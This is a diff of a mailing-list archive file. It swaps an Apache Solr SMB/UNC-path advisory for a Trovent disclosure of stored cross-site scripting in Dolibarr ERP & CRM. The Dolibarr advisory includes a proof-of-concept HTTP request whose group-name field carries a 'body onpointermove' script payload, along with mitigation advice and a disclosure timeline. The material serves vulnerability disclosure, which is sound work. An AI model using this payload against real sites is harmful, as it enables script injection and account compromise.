@@ -1,34 +1,145 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/12/18/2
-Message-ID: <1a42c865-2a9b-a8c1-a422-140d180d76f7@apache.org>
-Date: Sat, 18 Dec 2021 16:03:14 +0000
-From: Jan Høydahl <janhoy@...che.org>
-To: oss-security@...ts.openwall.com
-Subject: CVE-2021-44548: Apache Solr information disclosure vulnerability through DataImportHandler 
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/11/10/1
+Message-ID: <OpF3Ka8B9NOKStlDWy808_uPhKQ3flbllrA6ylRDkyen9W3HMT3I3RgPBSnq7949ZRU5Xld2MRpjSmRJrWVpjBvtfdYpPHLwNRPY9Dm6orU=@trovent.io>
+Date: Wed, 10 Nov 2021 11:36:13 +0000
+From: Stefan Pietsch <s.pietsch@...vent.io>
+To: Packet Storm <submissions@...ketstormsecurity.com>, Full Disclosure <fulldisclosure@...lists.org>, oss-security <oss-security@...ts.openwall.com>
+Subject: Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM
 Content-Type: text/plain; charset=utf-8
 
-Severity: moderate
+# Trovent Security Advisory 2105-02 #
+#####################################
 
-Description:
 
-An Improper Input Validation vulnerability in DataImportHandler of Apache Solr allows an attacker to provide a Windows UNC path resulting in an SMB network call being made from the Solr host to another host on the network. If the attacker has wider access to the network, this may lead to SMB attacks, which may result in:
+Stored cross-site scripting in Dolibarr ERP & CRM
+#################################################
 
-* The exfiltration of sensitive data such as OS user hashes (NTLM/LM hashes),
-* In case of misconfigured systems, SMB Relay Attacks which can lead to user impersonation on SMB Shares or, in a worse-case scenario, Remote Code Execution
 
-This issue affects all Apache Solr versions prior to 8.11.1. This issue only affects Windows.
+Overview
+########
 
-This issue is being tracked as SOLR-15826
+Advisory ID: TRSA-2105-02
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2105-02
+Affected product: Dolibarr ERP & CRM
+Tested versions: Dolibarr 13.0.2
+Vendor: Dolibarr foundation, https://www.dolibarr.org
+Credits: Trovent Security GmbH, Nick Decker
 
-Mitigation:
 
-Upgrade to Solr 8.11.1, and/or ensure only trusted clients can make requests to Solr's DataImport handler.
+Detailed description
+####################
 
-Credit:
+Trovent Security GmbH discovered that the Dolibarr application does not escape
+"greater than" and "smaller than" characters if they are reflected in one of the
+small pop-up windows with details of the object.
+This allows an attacker to add certain custom HTML tags and attributes.
+In our PoC we used a "body" tag in conjunction with an "onpointermove" attribute
+to achieve constant execution of the inserted JavaScript code.
 
-Apache Solr would like to thank LaiHan of Nsfocus security team for reporting the issue
+Severity: Critical
+CVSS Score: 9.0 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)
+CWE ID: CWE-79
+CVE ID: CVE-2021-33618
 
-References:
 
-https://solr.apache.org/security.html#cve-2021-44548-apache-solr-information-disclosure-vulnerability-through-dataimporthandler
+Proof of concept
+################
 
+This is the HTTP request to change the group name:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /user/group/card.php HTTP/1.1
+Host: 10.11.9.80
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 -securitytest-for-dolibarr
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------329097076628264922392755475836
+Content-Length: 950
+Origin: http://10.11.9.80
+Connection: close
+Referer: http://10.11.9.80/user/group/card.php?id=1&action=edit&token=4726524fe505b027519a535e08c11fb6
+Cookie: PHPSESSID=8s2jl8fhmbm5th8r4baasak1q2; DOLSESSID_736206a821984837877b8a6a901910d2=4jkf7smp24evfm3vvnnunj8jaq
+Upgrade-Insecure-Requests: 1
+
+- -----------------------------329097076628264922392755475836
+Content-Disposition: form-data; name="token"
+
+6585d0838337cafddc3387fcccbe9d91
+- -----------------------------329097076628264922392755475836
+Content-Disposition: form-data; name="action"
+
+update
+- -----------------------------329097076628264922392755475836
+Content-Disposition: form-data; name="backtopage"
+
+/user/group/card.php?id=1
+- -----------------------------329097076628264922392755475836
+Content-Disposition: form-data; name="id"
+
+1
+- -----------------------------329097076628264922392755475836
+Content-Disposition: form-data; name="nom"
+
+Trovent<<body onpointermove=alert(1) <>test
+- -----------------------------329097076628264922392755475836
+Content-Disposition: form-data; name="note"
+
+
+- -----------------------------329097076628264922392755475836
+Content-Disposition: form-data; name="save"
+
+Save
+- -----------------------------329097076628264922392755475836--
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+CODE:
+
+The HTML code of the site then includes the attribute in its body tag:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+<body id="mainbody" class="sidebar-collapse" <="" onpointermove="alert(1)" style="margin-bottom: 26px;">
+
+<!-- Start top horizontal -->
+<div class="side-nav-vert"><div id="id-top"><div id="tmenu_tooltip" class="tmenu">
+[...]
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Solution / Workaround
+#####################
+
+To mitigate this vulnerability, we recommend to always escape the user input
+regardless of where it is reflected. Additionally we recommend to blacklist all
+HTML tags and attributes.
+
+Fixed in Dolibarr version 14.0.0, verified by Trovent.
+
+
+History
+#######
+
+2021-05-25: Vulnerability found
+2021-05-28: CVE ID requested & received
+2021-05-31: Vendor contacted
+2021-06-02: Vendor reported the vulnerability as fixed
+2021-11-08: Add information about fixed version
+2021-11-10: Advisory published
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (856 bytes)
